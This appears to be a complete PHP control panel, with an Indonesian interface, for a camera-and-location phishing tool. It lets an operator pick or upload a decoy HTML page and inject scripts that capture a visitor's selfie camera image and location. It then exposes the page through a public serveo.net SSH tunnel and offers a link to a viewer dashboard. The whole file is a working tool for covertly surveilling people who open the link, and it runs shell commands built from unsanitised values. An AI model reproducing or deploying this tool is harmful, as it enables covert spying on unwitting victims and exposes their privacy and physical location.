<?php
// --- Info Server ---
$os = php_uname('s');
$arch = php_uname('m');
$php_version = phpversion();
$server_software = $_SERVER['SERVER_SOFTWARE'] ?? 'Tidak diketahui';

// --- Cek SSH 
$sshAvailable = file_exists('/data/data/com.termux/files/usr/bin/ssh') || file_exists('/usr/bin/ssh');
// --- Template ---
$templateDir = __DIR__."/html";
if(!is_dir($templateDir)) mkdir($templateDir, 0755);

$templates = [];
foreach(glob($templateDir."/*.html") as $file){
    $templates[] = basename($file);
}

// --- Temp folder ---
$tmpDir = __DIR__.'/tmp';
if(!is_dir($tmpDir)) mkdir($tmpDir, 0755);
$pidFile = $tmpDir.'/serveo.pid';
$logFile = $tmpDir.'/serveo.log';

// --- Handle POST ---
if($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])){

    // --- Start Forwarding ---
    if($_POST['action']==='startForwarding'){
        if(!$sshAvailable){
            echo json_encode(['status'=>'error','msg'=>'SSH tidak tersedia di server']);
            exit;
        }

        $template = $_POST['template'] ?? '';
        $aksiStr = $_POST['aksi'] ?? '';
        $aksi = $aksiStr ? explode(",",$aksiStr) : [];
        $port = $_SERVER['SERVER_PORT'] ?? 80;

        // Hentikan PID lama jika ada
        if(file_exists($pidFile)){
            $oldPid = trim(file_get_contents($pidFile));
            if($oldPid) shell_exec("kill $oldPid 2>/dev/null");
        }

        // Copy template + inject JS
        if($template && file_exists($templateDir."/".$template)){
            $content = file_get_contents($templateDir."/".$template);
            $injection = "";
            if(in_array("suara",$aksi)) $injection .= '<script src="play.js"></script>';
            if(in_array("kamera",$aksi)) $injection .= '<script src="camloc.js"></script>';
            $content = str_ireplace("</body>", $injection."</body>", $content);
            file_put_contents(__DIR__."/index.html", $content);
        }

        // Jalankan Serveo
        shell_exec("rm -f $logFile");
        $pid = trim(shell_exec("ssh -T -o StrictHostKeyChecking=no -R 80:localhost:$port serveo.net > $logFile 2>&1 & echo $!"));
        file_put_contents($pidFile, $pid);

        echo json_encode(['status'=>'started','log'=>'tmp/serveo.log']);
        exit;
    }

    // --- Stop Forwarding ---
    if($_POST['action']==='stopForwarding'){
        if(file_exists($pidFile)){
            $pid = trim(file_get_contents($pidFile));
            shell_exec("kill $pid 2>/dev/null");
            unlink($pidFile);
        }
        echo json_encode(['status'=>'stopped']);
        exit;
    }

    // --- Upload Template ---
    if($_POST['action']==='uploadTemplate'){
        if(isset($_FILES['uploadHtml']) && $_FILES['uploadHtml']['error']===0){
            $filename = basename($_FILES['uploadHtml']['name']);
            $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
            if($ext!=='html' || $_FILES['uploadHtml']['size']>1048576){
                echo json_encode(['status'=>'error','msg'=>'Hanya HTML max 1MB']); exit;
            }
            $target = $templateDir."/".$filename;
            if(move_uploaded_file($_FILES['uploadHtml']['tmp_name'],$target)){
                echo json_encode(['status'=>'success','file'=>$filename]);
            } else echo json_encode(['status'=>'error','msg'=>'Gagal upload']);
        } else echo json_encode(['status'=>'error','msg'=>'File tidak valid']);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Server Info & Forwarding</title>
<style>
body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;}
.container{background:rgba(255,255,255,0.95);padding:20px 30px;border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,0.1);max-width:700px;width:100%;position:relative;}
h2,h3{text-align:center;color:#333;}
ul{list-style:none;padding:0;}
li{margin:8px 0;padding:10px;background:#fff;border-radius:10px;box-shadow:0 2px 5px rgba(0,0,0,0.05);}
.label{font-weight:bold;}
.btn{display:block;width:100%;padding:12px;margin-top:20px;background:#007bff;color:#fff;border:none;border-radius:10px;cursor:pointer;font-size:16px;font-weight:bold;transition:0.3s;}
.btn:hover{opacity:0.9;}
.hidden{display:none;}
.mode{margin-top:20px;}
label{display:block;margin:10px 0;cursor:pointer;}
input[type="checkbox"]{margin-right:10px;}
select{width:100%;padding:10px;border-radius:10px;border:1px solid #ccc;font-size:14px;}
.dropdown-wrapper{display:flex;align-items:center;gap:10px;margin-top:15px;position:relative;}
.eye-btn{background:#28a745;border:none;color:#fff;border-radius:50%;width:40px;height:40px;font-size:18px;cursor:pointer;}
iframe{width:100%;height:300px;margin-top:15px;border:1px solid #ccc;border-radius:10px;}
#statusMsg{margin-top:10px;font-weight:bold;white-space:pre-wrap;}
#forwardUrl{margin-top:10px;display:flex;gap:10px;align-items:center;}
#forwardUrl input{flex:1;padding:8px;border-radius:8px;border:1px solid #ccc;}
.small-btn {padding:6px 12px;font-size:14px;width:auto;background:#28a745;margin:0;}
.footer{position:absolute;bottom:10px;right:20px;font-size:12px;color:#555;}
#dashboardBtn {margin-top:15px;}
#sshWarning{color:red;margin-top:10px;}
</style>
</head>
<body>
<div class="container">
    <h2>Info Server & Perangkat</h2>
    <ul>
        <li><span class="label">OS:</span> <?= htmlspecialchars($os) ?></li>
        <li><span class="label">Arsitektur:</span> <?= htmlspecialchars($arch) ?></li>
        <li><span class="label">PHP Version:</span> <?= htmlspecialchars($php_version) ?></li>
        <li><span class="label">Web Server:</span> <?= htmlspecialchars($server_software) ?></li>
    </ul>

    <h3>Pilih Mode Aksi</h3>
    <div class="mode">
        <label><input type="checkbox" name="aksi" value="suara"> Putar Suara</label>
        <label><input type="checkbox" name="aksi" value="kamera"> Capture Kamera Selfie + Lokasi</label>
    </div>

    <h3>Pilih Template</h3>
    <div class="dropdown-wrapper">
        <select id="templateSelect">
            <option value="">-- Pilih Template --</option>
            <option value="upload">⬆ Upload Baru</option>
            <?php foreach($templates as $tpl): ?>
            <option value="<?= htmlspecialchars($tpl) ?>"><?= htmlspecialchars($tpl) ?></option>
            <?php endforeach; ?>
        </select>
        <button class="eye-btn" onclick="togglePreview()">👁</button>
    </div>

    <div id="uploadField" class="hidden">
        <input type="file" id="uploadHtml" accept=".html">
        <button class="btn" id="uploadBtn">Upload Template</button>
    </div>

    <iframe id="previewFrame" class="hidden"></iframe>

    <button class="btn" id="forwardBtn" <?= $sshAvailable ? '' : 'disabled' ?>>Start Forwarding</button>
    <div id="sshWarning" style="<?= $sshAvailable ? 'display:none;' : '' ?>">❌ SSH tidak terinstall di server. Forwarding tidak bisa dijalankan.</div>

    <div id="statusMsg"></div>

    <div id="forwardUrl" class="hidden">
        <input type="text" id="serveoUrl" readonly>
        <button class="btn small-btn" id="copyBtn">Copy URL</button>
    </div>

    <div id="dashboardDiv">
        <button class="btn small-btn" id="dashboardBtn">Buka Dashboard</button>
    </div>

    <div class="footer">Created by Hoesnie</div>
</div>

<script>
let forwarding = false;
let logInterval = null;

function togglePreview(){
    let select = document.getElementById("templateSelect");
    let val = select.value;
    let frame = document.getElementById("previewFrame");
    if(frame.classList.contains("hidden")){
        if(val && val!=="upload"){
            frame.src="html/"+val;
            frame.classList.remove("hidden");
        }
    } else {
        frame.classList.add("hidden");
        frame.src="";
    }
    document.getElementById("uploadField").classList.toggle("hidden", val!=="upload");
}

document.getElementById("templateSelect").addEventListener("change", function(){
    let val = this.value;
    let uploadField = document.getElementById("uploadField");
    if(val === "upload"){
        uploadField.classList.remove("hidden");
        document.getElementById("previewFrame").classList.add("hidden");
    } else {
        uploadField.classList.add("hidden");
    }
});

// Upload template
document.getElementById("uploadBtn").onclick = function(){
    let fileInput = document.getElementById("uploadHtml");
    if(fileInput.files.length===0){ alert("Pilih file HTML untuk diupload!"); return; }
    let formData = new FormData();
    formData.append("action","uploadTemplate");
    formData.append("uploadHtml", fileInput.files[0]);
    fetch("",{method:"POST",body:formData})
    .then(r=>r.json())
    .then(resp=>{
        if(resp.status==="success"){
            let select = document.getElementById("templateSelect");
            let opt = document.createElement("option");
            opt.value = resp.file;
            opt.textContent = resp.file;
            select.appendChild(opt);
            select.value = resp.file;
            alert("✅ Template berhasil diupload!");
            togglePreview();
        } else alert("❌ "+resp.msg);
    });
};

// Start/Stop Forwarding
document.getElementById("forwardBtn").onclick = function(){
    let btn = this;
    let status = document.getElementById("statusMsg");
    let serveoInput = document.getElementById("serveoUrl");

    if(!forwarding){
        if(!<?= $sshAvailable ? 'true' : 'false' ?>){
            alert("SSH tidak terinstall di server. Forwarding tidak bisa dijalankan.");
            return;
        }

        let template = document.getElementById("templateSelect").value;
        let aksiEls = document.querySelectorAll('input[name="aksi"]:checked');
        let aksi = Array.from(aksiEls).map(e=>e.value);
        if(!template){ alert("❌ Pilih template dulu!"); return; }

        btn.disabled = true;
        fetch("",{
            method:"POST",
            body:new URLSearchParams({action:"startForwarding", template:template, aksi:aksi.join(",")})
        })
        .then(r=>r.json())
        .then(resp=>{
            forwarding = true;
            btn.innerText = "Stop Forwarding";
            btn.style.background="#dc3545";
            btn.disabled = false;

            document.getElementById("forwardUrl").classList.remove("hidden");
            serveoInput.value = "Menunggu Serveo tunnel...";

            logInterval = setInterval(()=>{
                fetch(resp.log+"?"+Date.now())
                .then(r=>r.text())
                .then(log=>{
                    let match = log.match(/Forwarding\s+HTTP traffic from\s+(https:\/\/[^\s]+)/i);
                    if(match){
                        serveoInput.value = match[1];
                        clearInterval(logInterval);
                    }
                });
            },2000);

            document.getElementById("dashboardBtn").onclick = function(){
                const port = <?= $_SERVER['SERVER_PORT'] ?>;
                window.open(`http://localhost:${port}/viewer.php`, "_blank");
            };
        });

    } else {
        btn.disabled = true;
        fetch("",{method:"POST",body:new URLSearchParams({action:"stopForwarding"})})
        .then(()=> {
            forwarding = false;
            btn.innerText = "Start Forwarding";
            btn.style.background="#007bff";
            btn.disabled = <?= $sshAvailable ? 'false' : 'true' ?>;
            serveoInput.value = "";
            document.getElementById("forwardUrl").classList.add("hidden");
            status.innerText = "✅ Forwarding dihentikan.";
            if(logInterval) clearInterval(logInterval);
        });
    }
};

// Copy URL
document.getElementById("copyBtn").onclick = function(){
    let serveoInput = document.getElementById("serveoUrl");
    navigator.clipboard.writeText(serveoInput.value).then(()=>alert("URL disalin!"));
};
</script>
</body>
</html>